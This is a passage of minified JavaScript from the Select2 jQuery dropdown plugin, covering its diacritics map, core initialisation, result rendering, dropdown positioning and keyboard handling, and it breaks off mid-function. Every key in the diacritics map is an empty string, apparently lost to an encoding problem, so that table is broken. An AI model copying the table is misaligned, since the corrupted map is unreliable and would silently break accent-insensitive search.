class='select2-measure-scrollbar'></div>",M={"":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"A","":"AA","":"AE","":"AE","":"AE","":"AO","":"AU","":"AV","":"AV","":"AY","":"B","":"B","":"B","":"B","":"B","":"B","":"B","":"B","":"C","":"C","":"C","":"C","":"C","":"C","":"C","":"C","":"C","":"C","":"C","":"D","":"D","":"D","":"D","":"D","":"D","":"D","":"D","":"D","":"D","":"D","":"D","":"D","":"DZ","":"DZ","":"Dz","":"Dz","":"E","":"E","":"E","":"E","":"E","":"E","":"E","":"E","":"E","":"E","":"E","":"E","":"E","":"E","":"E","":"E","":"E","":"E","":"E","":"E","":"E","":"E","":"E","":"E","":"E","":"E","":"E","":"E","":"E","":"F","":"F","":"F","":"F","":"F","":"G","":"G","":"G","":"G","":"G","":"G","":"G","":"G","":"G","":"G","":"G","":"G","":"G","":"G","":"H","":"H","":"H","":"H","":"H","":"H","":"H","":"H","":"H","":"H","":"H","":"H","":"H","":"I","":"I","":"I","":"I","":"I","":"I","":"I","":"I","":"I","":"I","":"I","":"I","":"I","":"I","":"I","":"I","":"I","":"I","":"I","":"J","":"J","":"J","":"J","":"K","":"K","":"K","":"K","":"K","":"K","":"K","":"K","":"K","":"K","":"K","":"K","":"K","":"L","":"L","":"L","":"L","":"L","":"L","":"L","":"L","":"L","":"L","":"L","":"L","":"L","":"L","":"L","":"L","":"L","":"LJ","":"Lj","":"M","":"M","":"M","":"M","":"M","":"M","":"M","":"N","":"N","":"N","":"N","":"N","":"N","":"N","":"N","":"N","":"N","":"N","":"N","":"N","":"N","":"N","":"NJ","":"Nj","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"O","":"OI","":"OO","":"OU","":"P","":"P","":"P","":"P","":"P","":"P","":"P","":"P","":"P","":"Q","":"Q","":"Q","":"Q","":"Q","":"R","":"R","":"R","":"R","":"R","":"R","":"R","":"R","":"R","":"R","":"R","":"R","":"R","":"R","":"R","":"R","":"S","":"S","":"S","":"S","":"S","":"S","":"S","":"S","":"S","":"S","":"S","":"S","":"S","":"S","":"S","":"S","":"T","":"T","":"T","":"T","":"T","":"T","":"T","":"T","":"T","":"T","":"T","":"T","":"T","":"T","":"TZ","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"V","":"V","":"V","":"V","":"V","":"V","":"V","":"VY","":"W","":"W","":"W","":"W","":"W","":"W","":"W","":"W","":"W","":"X","":"X","":"X","":"X","":"Y","":"Y","":"Y","":"Y","":"Y","":"Y","":"Y","":"Y","":"Y","":"Y","":"Y","":"Y","":"Y","":"Y","":"Z","":"Z","":"Z","":"Z","":"Z","":"Z","":"Z","":"Z","":"Z","":"Z","":"Z","":"Z","":"Z","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"aa","":"ae","":"ae","":"ae","":"ao","":"au","":"av","":"av","":"ay","":"b","":"b","":"b","":"b","":"b","":"b","":"b","":"b","":"c","":"c","":"c","":"c","":"c","":"c","":"c","":"c","":"c","":"c","":"c","":"c","":"d","":"d","":"d","":"d","":"d","":"d","":"d","":"d","":"d","":"d","":"d","":"d","":"d","":"dz","":"dz","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"f","":"f","":"f","":"f","":"f","":"g","":"g","":"g","":"g","":"g","":"g","":"g","":"g","":"g","":"g","":"g","":"g","":"g","":"g","":"h","":"h","":"h","":"h","":"h","":"h","":"h","":"h","":"h","":"h","":"h","":"h","":"h","":"h","":"hv","":"i","":"i","":"i","":"i","":"i","":"i","":"i","":"i","":"i","":"i","":"i","":"i","":"i","":"i","":"i","":"i","":"i","":"i","":"i","":"j","":"j","":"j","":"j","":"j","":"k","":"k","":"k","":"k","":"k","":"k","":"k","":"k","":"k","":"k","":"k","":"k","":"k","":"l","":"l","":"l","":"l","":"l","":"l","":"l","":"l","":"l","":"l","":"l","":"l","":"l","":"l","":"l","":"l","":"l","":"l","":"lj","":"m","":"m","":"m","":"m","":"m","":"m","":"m","":"n","":"n","":"n","":"n","":"n","":"n","":"n","":"n","":"n","":"n","":"n","":"n","":"n","":"n","":"n","":"n","":"nj","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"oi","":"ou","":"oo","":"p","":"p","":"p","":"p","":"p","":"p","":"p","":"p","":"p","":"q","":"q","":"q","":"q","":"q","":"r","":"r","":"r","":"r","":"r","":"r","":"r","":"r","":"r","":"r","":"r","":"r","":"r","":"r","":"r","":"r","":"s","":"s","":"s","":"s","":"s","":"s","":"s","":"s","":"s","":"s","":"s","":"s","":"s","":"s","":"s","":"s","":"s","":"t","":"t","":"t","":"t","":"t","":"t","":"t","":"t","":"t","":"t","":"t","":"t","":"t","":"t","":"t","":"tz","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"v","":"v","":"v","":"v","":"v","":"v","":"v","":"vy","":"w","":"w","":"w","":"w","":"w","":"w","":"w","":"w","":"w","":"w","":"x","":"x","":"x","":"x","":"y","":"y","":"y","":"y","":"y","":"y","":"y","":"y","":"y","":"y","":"y","":"y","":"y","":"y","":"y","":"z","":"z","":"z","":"z","":"z","":"z","":"z","":"z","":"z","":"z","":"z","":"z","":"z"};E=t(document),T=function(){var t=1;return function(){return t++}}(),E.on("mousemove",(function(t){A.x=t.pageX,A.y=t.pageY})),C=x(Object,{bind:function(t){var e=this;return function(){t.apply(e,arguments)}},init:function(i){var o,n,r=".select2-results";this.opts=i=this.prepareOpts(i),this.id=i.id,i.element.data("select2")!==e&&null!==i.element.data("select2")&&i.element.data("select2").destroy(),this.container=this.createContainer(),this.containerId="s2id_"+(i.element.attr("id")||"autogen"+T()),this.containerSelector="#"+this.containerId.replace(/([;&,\.\+\*\~':"\!\^#$%@\[\]\(\)=>\|])/g,"\\$1"),this.container.attr("id",this.containerId),this.body=function(t){var e,i=!1;return function(){return!1===i&&(e=t(),i=!0),e}}((function(){return i.element.closest("body")})),h(this.container,this.opts.element,this.opts.adaptContainerCssClass),this.container.attr("style",i.element.attr("style")),this.container.css(b(i.containerCss)),this.container.addClass(b(i.containerCssClass)),this.elementTabIndex=this.opts.element.attr("tabindex"),this.opts.element.data("select2",this).attr("tabindex","-1").before(this.container).on("click.select2",p),this.container.data("select2",this),this.dropdown=this.container.find(".select2-drop"),h(this.dropdown,this.opts.element,this.opts.adaptDropdownCssClass),this.dropdown.addClass(b(i.dropdownCssClass)),this.dropdown.data("select2",this),this.dropdown.on("click",p),this.results=o=this.container.find(r),this.search=n=this.container.find("input.select2-input"),this.queryCount=0,this.resultsPage=0,this.context=null,this.initContainer(),this.container.on("click",p),l(this.results),this.dropdown.on("mousemove-filtered touchstart touchmove touchend",r,this.bind(this.highlightUnderEvent)),function(t,e){var i=c(t,(function(t){e.trigger("scroll-debounced",t)}));e.on("scroll",(function(t){a(t.target,e.get())>=0&&i(t)}))}(80,this.results),this.dropdown.on("scroll-debounced",r,this.bind(this.loadMoreIfNeeded)),t(this.container).on("change",".select2-input",(function(t){t.stopPropagation()})),t(this.dropdown).on("change",".select2-input",(function(t){t.stopPropagation()})),t.fn.mousewheel&&o.mousewheel((function(t,e,i,a){var n=o.scrollTop();a>0&&0>=n-a?(o.scrollTop(0),p(t)):0>a&&o.get(0).scrollHeight-o.scrollTop()+a<=o.height()&&(o.scrollTop(o.get(0).scrollHeight-o.height()),p(t))})),s(n),n.on("keyup-change input paste",this.bind(this.updateResults)),n.on("focus",(function(){n.addClass("select2-focused")})),n.on("blur",(function(){n.removeClass("select2-focused")})),this.dropdown.on("mouseup",r,this.bind((function(e){t(e.target).closest(".select2-result-selectable").length>0&&(this.highlightUnderEvent(e),this.selectHighlighted(e))}))),this.dropdown.on("click mouseup mousedown",(function(t){t.stopPropagation()})),t.isFunction(this.opts.initSelection)&&(this.initSelection(),this.monitorSource()),null!==i.maximumInputLength&&this.search.attr("maxlength",i.maximumInputLength);var d=i.element.prop("disabled");d===e&&(d=!1),this.enable(!d);var u=i.element.prop("readonly");u===e&&(u=!1),this.readonly(u),D=D||function(){var e=t(O);e.appendTo("body");var i={width:e.width()-e[0].clientWidth,height:e.height()-e[0].clientHeight};return e.remove(),i}(),this.autofocus=i.element.prop("autofocus"),i.element.prop("autofocus",!1),this.autofocus&&this.focus(),this.nextSearchTerm=e},destroy:function(){var t=this.opts.element,i=t.data("select2");this.close(),this.propertyObserver&&(delete this.propertyObserver,this.propertyObserver=null),i!==e&&(i.container.remove(),i.dropdown.remove(),t.removeClass("select2-offscreen").removeData("select2").off(".select2").prop("autofocus",this.autofocus||!1),this.elementTabIndex?t.attr({tabindex:this.elementTabIndex}):t.removeAttr("tabindex"),t.show())},optionToData:function(t){return t.is("option")?{id:t.prop("value"),text:t.text(),element:t.get(),css:t.attr("class"),disabled:t.prop("disabled"),locked:o(t.attr("locked"),"locked")||o(t.data("locked"),!0)}:t.is("optgroup")?{text:t.attr("label"),children:[],element:t.get(),css:t.attr("class")}:void 0},prepareOpts:function(i){var a,r,s,l,c=this;if("select"===(a=i.element).get(0).tagName.toLowerCase()&&(this.select=r=i.element),r&&t.each(["id","multiple","ajax","query","createSearchChoice","initSelection","data","tags"],(function(){if(this in i)throw new Error("Option '"+this+"' is not allowed for Select2 when attached to a <select> element.")})),"function"!=typeof(i=t.extend({},{populateResults:function(a,o,n){var r,s=this.opts.id;(r=function(a,o,l){var d,p,u,h,f,m,g,v,y,$;for(d=0,p=(a=i.sortResults(a,o,n)).length;p>d;d+=1)h=!(f=!0===(u=a[d]).disabled)&&s(u)!==e,m=u.children&&u.children.length>0,(g=t("<li></li>")).addClass("select2-results-dept-"+l),g.addClass("select2-result"),g.addClass(h?"select2-result-selectable":"select2-result-unselectable"),f&&g.addClass("select2-disabled"),m&&g.addClass("select2-result-with-children"),g.addClass(c.opts.formatResultCssClass(u)),(v=t(document.createElement("div"))).addClass("select2-result-label"),($=i.formatResult(u,v,n,c.opts.escapeMarkup))!==e&&v.html($),g.append(v),m&&((y=t("<ul></ul>")).addClass("select2-result-sub"),r(u.children,y,l+1),g.append(y)),g.data("select2-data",u),o.append(g)})(o,a,0)}},t.fn.select2.defaults,i)).id&&(s=i.id,i.id=function(t){return t[s]}),t.isArray(i.element.data("select2Tags"))){if("tags"in i)throw"tags specified as both an attribute 'data-select2-tags' and in options of Select2 "+i.element.attr("id");i.tags=i.element.data("select2Tags")}if(r?(i.query=this.bind((function(t){var i,o,n,r={results:[],more:!1},s=t.term;n=function(e,i){var a;e.is("option")?t.matcher(s,e.text(),e)&&i.push(c.optionToData(e)):e.is("optgroup")&&(a=c.optionToData(e),e.children().each2((function(t,e){n(e,a.children)})),a.children.length>0&&i.push(a))},i=a.children(),this.getPlaceholder()!==e&&i.length>0&&((o=this.getPlaceholderOption())&&(i=i.not(o))),i.each2((function(t,e){n(e,r.results)})),t.callback(r)})),i.id=function(t){return t.id},i.formatResultCssClass=function(t){return t.css}):"query"in i||("ajax"in i?((l=i.element.data("ajax-url"))&&l.length>0&&(i.ajax.url=l),i.query=g.call(i.element,i.ajax)):"data"in i?i.query=v(i.data):"tags"in i&&(i.query=y(i.tags),i.createSearchChoice===e&&(i.createSearchChoice=function(e){return{id:t.trim(e),text:t.trim(e)}}),i.initSelection===e&&(i.initSelection=function(e,a){var r=[];t(n(e.val(),i.separator)).each((function(){var e={id:this,text:this},a=i.tags;t.isFunction(a)&&(a=a()),t(a).each((function(){return o(this.id,e.id)?(e=this,!1):void 0})),r.push(e)})),a(r)}))),"function"!=typeof i.query)throw"query function not defined for Select2 "+i.element.attr("id");return i},monitorSource:function(){var t,i,a=this.opts.element;a.on("change.select2",this.bind((function(){!0!==this.opts.element.data("select2-change-triggered")&&this.initSelection()}))),t=this.bind((function(){var t=a.prop("disabled");t===e&&(t=!1),this.enable(!t);var i=a.prop("readonly");i===e&&(i=!1),this.readonly(i),h(this.container,this.opts.element,this.opts.adaptContainerCssClass),this.container.addClass(b(this.opts.containerCssClass)),h(this.dropdown,this.opts.element,this.opts.adaptDropdownCssClass),this.dropdown.addClass(b(this.opts.dropdownCssClass))})),a.on("propertychange.select2",t),this.mutationCallback===e&&(this.mutationCallback=function(e){e.forEach(t)}),(i=window.MutationObserver||window.WebKitMutationObserver||window.MozMutationObserver)!==e&&(this.propertyObserver&&(delete this.propertyObserver,this.propertyObserver=null),this.propertyObserver=new i(this.mutationCallback),this.propertyObserver.observe(a.get(0),{attributes:!0,subtree:!1}))},triggerSelect:function(e){var i=t.Event("select2-selecting",{val:this.id(e),object:e});return this.opts.element.trigger(i),!i.isDefaultPrevented()},triggerChange:function(e){e=e||{},e=t.extend({},e,{type:"change",val:this.val()}),this.opts.element.data("select2-change-triggered",!0),this.opts.element.trigger(e),this.opts.element.data("select2-change-triggered",!1),this.opts.element.click(),this.opts.blurOnChange&&this.opts.element.blur()},isInterfaceEnabled:function(){return!0===this.enabledInterface},enableInterface:function(){var t=this._enabled&&!this._readonly,e=!t;return t!==this.enabledInterface&&(this.container.toggleClass("select2-container-disabled",e),this.close(),this.enabledInterface=t,!0)},enable:function(t){t===e&&(t=!0),this._enabled!==t&&(this._enabled=t,this.opts.element.prop("disabled",!t),this.enableInterface())},disable:function(){this.enable(!1)},readonly:function(t){return t===e&&(t=!1),this._readonly!==t&&(this._readonly=t,this.opts.element.prop("readonly",t),this.enableInterface(),!0)},opened:function(){return this.container.hasClass("select2-dropdown-open")},positionDropdown:function(){var e,i,a,o,n,r=this.dropdown,s=this.container.offset(),l=this.container.outerHeight(!1),c=this.container.outerWidth(!1),d=r.outerHeight(!1),p=t(window),u=p.width(),h=p.height(),f=p.scrollLeft()+u,m=p.scrollTop()+h,g=s.top+l,v=s.left,y=m>=g+d,$=s.top-d>=this.body().scrollTop(),w=r.outerWidth(!1),x=f>=v+w;r.hasClass("select2-drop-above")?(i=!0,!$&&y&&(a=!0,i=!1)):(i=!1,!y&&$&&(a=!0,i=!0)),a&&(r.hide(),s=this.container.offset(),l=this.container.outerHeight(!1),c=this.container.outerWidth(!1),d=r.outerHeight(!1),f=p.scrollLeft()+u,m=p.scrollTop()+h,g=s.top+l,x=f>=(v=s.left)+(w=r.outerWidth(!1)),r.show()),this.opts.dropdownAutoWidth?(n=t(".select2-results",r)[0],r.addClass("select2-drop-auto-width"),r.css("width",""),(w=r.outerWidth(!1)+(n.scrollHeight===n.clientHeight?0:D.width))>c?c=w:w=c,x=f>=v+w):this.container.removeClass("select2-drop-auto-width"),"static"!==this.body().css("position")&&(g-=(e=this.body().offset()).top,v-=e.left),x||(v=s.left+c-w),o={left:v,width:c},i?(o.bottom=h-s.top,o.top="auto",this.container.addClass("select2-drop-above"),r.addClass("select2-drop-above")):(o.top=g,o.bottom="auto",this.container.removeClass("select2-drop-above"),r.removeClass("select2-drop-above")),o=t.extend(o,b(this.opts.dropdownCss)),r.css(o)},shouldOpen:function(){var e;return!this.opened()&&(!1!==this._enabled&&!0!==this._readonly&&(e=t.Event("select2-opening"),this.opts.element.trigger(e),!e.isDefaultPrevented()))},clearDropdownAlignmentPreference:function(){this.container.removeClass("select2-drop-above"),this.dropdown.removeClass("select2-drop-above")},open:function(){return!!this.shouldOpen()&&(this.opening(),!0)},opening:function(){var e,i=this.containerId,a="scroll."+i,o="resize."+i,n="orientationchange."+i;this.container.addClass("select2-dropdown-open").addClass("select2-container-active"),this.clearDropdownAlignmentPreference(),this.dropdown[0]!==this.body().children().last()[0]&&this.dropdown.detach().appendTo(this.body()),0==(e=t("#select2-drop-mask")).length&&((e=t(document.createElement("div"))).attr("id","select2-drop-mask").attr("class","select2-drop-mask"),e.hide(),e.appendTo(this.body()),e.on("mousedown touchstart click",(function(e){var i,a=t("#select2-drop");a.length>0&&((i=a.data("select2")).opts.selectOnBlur&&i.selectHighlighted({noFocus:!0}),i.close({focus:!0}),e.preventDefault(),e.stopPropagation())}))),this.dropdown.prev()[0]!==e[0]&&this.dropdown.before(e),t("#select2-drop").removeAttr("id"),this.dropdown.attr("id","select2-drop"),e.show(),this.positionDropdown(),this.dropdown.show(),this.positionDropdown(),this.dropdown.addClass("select2-drop-active");var r=this;this.container.parents().add(window).each((function(){t(this).on(o+" "+a+" "+n,(function(){r.positionDropdown()}))}))},close:function(){if(this.opened()){var e=this.containerId,i="scroll."+e,a="resize."+e,o="orientationchange."+e;this.container.parents().add(window).each((function(){t(this).off(i).off(a).off(o)})),this.clearDropdownAlignmentPreference(),t("#select2-drop-mask").hide(),this.dropdown.removeAttr("id"),this.dropdown.hide(),this.container.removeClass("select2-dropdown-open").removeClass("select2-container-active"),this.results.empty(),this.clearSearch(),this.search.removeClass("select2-active"),this.opts.element.trigger(t.Event("select2-close"))}},externalSearch:function(t){this.open(),this.search.val(t),this.updateResults(!1)},clearSearch:function(){},getMaximumSelectionSize:function(){return b(this.opts.maximumSelectionSize)},ensureHighlightVisible:function(){var e,i,a,o,n,r,s,l=this.results;if(!(0>(i=this.highlight()))){if(0==i)return void l.scrollTop(0);e=this.findHighlightableChoices().find(".select2-result-label"),o=(a=t(e[i])).offset().top+a.outerHeight(!0),i===e.length-1&&((s=l.find("li.select2-more-results")).length>0&&(o=s.offset().top+s.outerHeight(!0))),o>(n=l.offset().top+l.outerHeight(!0))&&l.scrollTop(l.scrollTop()+(o-n)),0>(r=a.offset().top-l.offset().top)&&"none"!=a.css("display")&&l.scrollTop(l.scrollTop()+r)}},findHighlightableChoices:function(){return this.results.find(".select2-result-selectable:not(.select2-disabled, .select2-selected)")},moveHighlight:function(e){for(var i=this.findHighlightableChoices(),a=this.highlight();a>-1&&a<i.length;){var o=t(i[a+=e]);if(o.hasClass("select2-result-selectable")&&!o.hasClass("select2-disabled")&&!o.hasClass("select2-selected")){this.highlight(a);break}}},highlight:function(e){var i,o,n=this.findHighlightableChoices();return 0===arguments.length?a(n.filter(".select2-highlighted")[0],n.get()):(e>=n.length&&(e=n.length-1),0>e&&(e=0),this.removeHighlight(),(i=t(n[e])).addClass("select2-highlighted"),this.ensureHighlightVisible(),void((o=i.data("select2-data"))&&this.opts.element.trigger({type:"select2-highlight",val:this.id(o),choice:o})))},removeHighlight:function(){this.results.find(".select2-highlighted").removeClass("select2-highlighted")},countSelectableResults:function(){return this.findHighlightableChoices().length},highlightUnderEvent:function(e){var i=t(e.target).closest(".select2-result-selectable");if(i.length>0&&!i.is(".select2-highlighted")){var a=this.findHighlightableChoices();this.highlight(a.index(i))}else 0==i.length&&this.removeHighlight()},loadMoreIfNeeded:function(){var t=this.results,e=t.find("li.select2-more-results"),i=this.resultsPage+1,a=this,o=this.search.val(),n=this.context;0!==e.length&&(e.offset().top-t.offset().top-t.height()<=this.opts.loadMorePadding&&(e.addClass("select2-active"),this.opts.query({element:this.opts.element,term:o,page:i,context:n,matcher:this.opts.matcher,callback:this.bind((function(r){a.opened()&&(a.opts.populateResults.call(this,t,r.results,{term:o,page:i,context:n}),a.postprocessResults(r,!1,!1),!0===r.more?(e.detach().appendTo(t).text(a.opts.formatLoadMore(i+1)),window.setTimeout((function(){a.loadMoreIfNeeded()}),10)):e.remove(),a.positionDropdown(),a.resultsPage=i,a.context=r.context,this.opts.element.trigger({type:"select2-loaded",items:r}))}))})))},tokenize:function(){},updateResults:function(i){function a(){c.removeClass("select2-active"),u.positionDropdown()}function n(t){d.html(t),a()}var r,s,l,c=this.search,d=this.results,p=this.opts,u=this,h=c.val(),f=t.data(this.container,"select2-last-term");if((!0===i||!f||!o(h,f))&&(t.data(this.container,"select2-last-term",h),!0===i||!1!==this.showSearchInput&&this.opened())){l=++this.queryCount;var m=this.getMaximumSelectionSize();if(m>=1&&(r=this.data(),t.isArray(r)&&r.length>=m&&$(p.formatSelectionTooBig,"formatSelectionTooBig")))return void n("<li class='select2-selection-limit'>"+p.formatSelectionTooBig(m)+"</li>");if(c.val().length<p.minimumInputLength)return $(p.formatInputTooShort,"formatInputTooShort")?n("<li class='select2-no-results'>"+p.formatInputTooShort(c.val(),p.minimumInputLength)+"</li>"):n(""),void(i&&this.showSearch&&this.showSearch(!0));if(p.maximumInputLength&&c.val().length>p.maximumInputLength)return void($(p.formatInputTooLong,"formatInputTooLong")?n("<li class='select2-no-results'>"+p.formatInputTooLong(c.val(),p.maximumInputLength)+"</li>"):n(""));p.formatSearching&&0===this.findHighlightableChoices().length&&n("<li class='select2-searching'>"+p.formatSearching()+"</li>"),c.addClass("select2-active"),this.removeHighlight(),(s=this.tokenize())!=e&&null!=s&&c.val(s),this.resultsPage=1,p.query({element:p.element,term:c.val(),page:this.resultsPage,context:null,matcher:p.matcher,callback:this.bind((function(r){var s;if(l==this.queryCount){if(!this.opened())return void this.search.removeClass("select2-active");if(this.context=r.context===e?null:r.context,this.opts.createSearchChoice&&""!==c.val()&&((s=this.opts.createSearchChoice.call(u,c.val(),r.results))!==e&&null!==s&&u.id(s)!==e&&null!==u.id(s)&&0===t(r.results).filter((function(){return o(u.id(this),u.id(s))})).length&&r.results.unshift(s)),0===r.results.length&&$(p.formatNoMatches,"formatNoMatches"))return void n("<li class='select2-no-results'>"+p.formatNoMatches(c.val())+"</li>");d.empty(),u.opts.populateResults.call(this,d,r.results,{term:c.val(),page:this.resultsPage,context:null}),!0===r.more&&$(p.formatLoadMore,"formatLoadMore")&&(d.append("<li class='select2-more-results'>"+u.opts.escapeMarkup(p.formatLoadMore(this.resultsPage))+"</li>"),window.setTimeout((function(){u.loadMoreIfNeeded()}),10)),this.postprocessResults(r,i),a(),this.opts.element.trigger({type:"select2-loaded",items:r})}}))})}},cancel:function(){this.close()},blur:function(){this.opts.selectOnBlur&&this.selectHighlighted({noFocus:!0}),this.close(),this.container.removeClass("select2-container-active"),this.search[0]===document.activeElement&&this.search.blur(),this.clearSearch(),this.selection.find(".select2-search-choice-focus").removeClass("select2-search-choice-focus")},focusSearch:function(){!function(t){t[0]!==document.activeElement&&window.setTimeout((function(){var e,i=t[0],a=t.val().length;t.focus(),t.is(":visible")&&i===document.activeElement&&(i.setSelectionRange?i.setSelectionRange(a,a):i.createTextRange&&((e=i.createTextRange()).collapse(!1),e.select()))}),0)}(this.search)},selectHighlighted:function(t){var e=this.highlight(),i=this.results.find(".select2-highlighted").closest(".select2-result").data("select2-data");i?(this.highlight(e),this.onSelect(i,t)):t&&t.noFocus&&this.close()},getPlaceholder:function(){var t;return this.opts.element.attr("placeholder")||this.opts.element.attr("data-placeholder")||this.opts.element.data("placeholder")||this.opts.placeholder||((t=this.getPlaceholderOption())!==e?t.text():e)},getPlaceholderOption:function(){if(this.select){var t=this.select.children("option").first();if(this.opts.placeholderOption!==e)return"first"===this.opts.placeholderOption&&t||"function"==typeof this.opts.placeholderOption&&this.opts.placeholderOption(this.select);if(""===t.text()&&""===t.val())return t}},initContainerWidth:function(){var i=function(){var i,a,o,n,r;if("off"===this.opts.width)return null;if("element"===this.opts.width)return 0===this.opts.element.outerWidth(!1)?"auto":this.opts.element.outerWidth(!1)+"px";if("copy"===this.opts.width||"resolve"===this.opts.width){if((i=this.opts.element.attr("style"))!==e)for(n=0,r=(a=i.split(";")).length;r>n;n+=1)if(null!==(o=a[n].replace(/\s/g,"").match(/^width:(([-+]?([0-9]*\.)?[0-9]+)(px|em|ex|%|in|cm|mm|pt|pc))/i))&&o.length>=1)return o[1];return"resolve"===this.opts.width?(i=this.opts.element.css("width")).indexOf("%")>0?i:0===this.opts.element.outerWidth(!1)?"auto":this.opts.element.outerWidth(!1)+"px":null}return t.isFunction(this.opts.width)?this.opts.width():this.opts.width}.call(this);null!==i&&this.container.css("width",i)}}),k=x(C,{createContainer:function(){return t(document.createElement("div")).attr({class:"select2-container"}).html(["<a href='javascript:void(0)' onclick='return false;' class='select2-choice' tabindex='-1'>","   <span class='select2-chosen'>&nbsp;</span><abbr class='select2-search-choice-close'></abbr>","   <span class='select2-arrow'><b></b></span>","</a>","<input class='select2-focusser select2-offscreen' type='text'/>","<div class='select2-drop select2-display-none'>","   <div class='select2-search'>","       <input type='text' autocomplete='off' autocorrect='off' autocapitalize='off' spellcheck='false' class='select2-input'/>","   </div>","   <ul class='select2-results'>","   </ul>","</div>"].join(""))},enableInterface:function(){this.parent.enableInterface.apply(this,arguments)&&this.focusser.prop("disabled",!this.isInterfaceEnabled())},opening:function(){var i,a,o;this.opts.minimumResultsForSearch>=0&&this.showSearch(!0),this.parent.opening.apply(this,arguments),!1!==this.showSearchInput&&this.search.val(this.focusser.val()),this.search.focus(),(i=this.search.get(0)).createTextRange?((a=i.createTextRange()).collapse(!1),a.select()):i.setSelectionRange&&(o=this.search.val().length,i.setSelectionRange(o,o)),""===this.search.val()&&this.nextSearchTerm!=e&&(this.search.val(this.nextSearchTerm),this.search.select()),this.focusser.prop("disabled",!0).val(""),this.updateResults(!0),this.opts.element.trigger(t.Event("select2-open"))},close:function(t){this.opened()&&(this.parent.close.apply(this,arguments),t=t||{focus:!0},this.focusser.removeAttr("disabled"),t.focus&&this.focusser.focus())},focus:function(){this.opened()?this.close():(this.focusser.removeAttr("disabled"),this.focusser.focus())},isFocused:function(){return this.container.hasClass("select2-container-active")},cancel:function(){this.parent.cancel.apply(this,arguments),this.focusser.removeAttr("disabled"),this.focusser.focus()},destroy:function(){t("label[for='"+this.focusser.attr("id")+"']").attr("for",this.opts.element.attr("id")),this.parent.destroy.apply(this,arguments)},initContainer:function(){var e,i=this.container,a=this.dropdown;this.opts.minimumResultsForSearch<0?this.showSearch(!1):this.showSearch(!0),this.selection=e=i.find(".select2-choice"),this.focusser=i.find(".select2-focusser"),this.focusser.attr("id","s2id_autogen"+T()),t("label[for='"+this.opts.element.attr("id")+"']").attr("for",this.focusser.attr("id")),this.focusser.attr("tabindex",this.elementTabIndex),this.search.on("keydown",this.bind((function(t){if(this.isInterfaceEnabled()){if(t.which===F.PAGE_UP||t.which===F.PAGE_DOWN)return void p(t);switch(t.which){case F.UP:case F.DOWN:return this.moveHighlight(t.which===F.UP?-1:1),void p(t);case F.ENTER:return this.selectHighlighted(),void p(t);case F.TAB:return void this.selectHighlighted({noFocus:!0});case F.ESC:return this.cancel(t),void p(t)}}}))),this.search.on("blur",this.bind((function(){document.activeElement===this.body().get(0)&&window.setTimeout(this.bind((function(){this.search.focus()})),0)}))),this.focusser.on("keydown",this.bind((function(t){if(this.isInterfaceEnabled()&&t.which!==F.TAB&&!F.isControl(t)&&!F.isFunctionKey(t)&&t.which!==F.ESC){if(!1===this.opts.openOnEnter&&t.which===F.ENTER)return void p(t);if(t.which==F.DOWN||t.which==F.UP||t.which==F.ENTER&&this.opts.openOnEnter){if(t.altKey||t.ctrlKey||t.shiftKey||t.metaKey)return;return this.open(),void p(t)}return t.which==F.DELETE||t.which==F.BACKSPACE?(this.opts.allowClear&&this.clear(),void p(t)):void 0}}))),s(this.focusser),this.focusser.on("keyup-change input",this.bind((function(t){if(this.opts.minimumResultsForSearch>=0){if(t.stopPropagation(),this.opened())return;this.open()}}))),e.on("mousedown","abbr",this.bind((function(t){this.isInterfaceEnabled()&&(this.clear(),function(t){t.preventDefault(),t.stopImmediatePropagation()}(t),this.close(),this.selection.focus())}))),e.on("mousedown",this.bind((function(e){this.container.hasClass("select2-container-active")||this.opts.element.trigger(t.Event("select2-focus")),this.opened()?this.close():this.isInterfaceEnabled()&&this.open(),p(e)}))),a.on("mousedown",this.bind((function(){this.search.focus()}))),e.on("focus",this.bind((function(t){p(t)}))),this.focusser.on("focus",this.bind((function(){this.container.hasClass("select2-container-active")||this.opts.element.trigger(t.Event("select2-focus")),this.container.addClass("select2-container-active")}))).on("blur",this.bind((function(){this.opened()||(this.container.removeClass("select2-container-active"),this.opts.element.trigger(t.Event("select2-blur")))}))),this.search.on("focus",this.bind((function(){this.container.hasClass("select2-container-active")||this.opts.element.trigger(t.Event("select2-focus")),this.container.addClass("select2-container-active")}))),this.initContainerWidth(),this.opts.element.addClass("select2-offscreen"),this.setPlaceholder()},clear:function(e){var i=this.selection.data("select2-data");if(i){var a=t.Event("select2-clearing");if(this.opts.element.trigger(a),a.isDefaultPrevented())return;var 